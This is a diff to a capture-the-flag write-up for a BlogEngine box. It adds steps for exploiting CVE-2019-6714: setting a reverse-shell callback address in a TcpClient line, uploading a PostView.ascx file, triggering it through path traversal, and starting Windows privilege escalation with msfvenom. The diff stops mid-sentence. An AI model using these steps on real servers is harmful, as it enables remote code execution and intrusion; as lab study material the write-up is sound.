@@ -44,8 +44,24 @@ __VIEWSTATE=mxGh%2BdQ%2F%2BpArh2IP5hEYlvCLap4USWw8NMWpW%2FCdFy6ebKKcxpebQBn520XB
 
 ### What is the CVE?
 
-> A quick google search of the BlogEngine version gives us **CVE-2019-6714**
+> A quick google search of the BlogEngine version returns **CVE-2019-6714**
 
 ### Who is the webserver running as?
 
+- First, set the reverse shell IP in the exploit code
+    - Edit this line: `System.Net.Sockets.TcpClient("10.10.10.20", 4445))`
+- Rename the file to PostView.ascx
+- Upload to blogengine portal
+    - Use this link: http://<target ip>/admin/app/editor/editpost.cshtml
+- Trigger uploaded exploit
+    - Use this link: http://<target ip>/?theme=../../App_Data/files
 
+> <code>whoami</code> returns **iis apppool\blog**
+
+## Windows Privilege Escalation
+
+### What is the OS version of this windows machine?
+
+- Generate shellcode with `msfvenom`
+
+> <code>systeminfo</code> returns shows the OS version is 
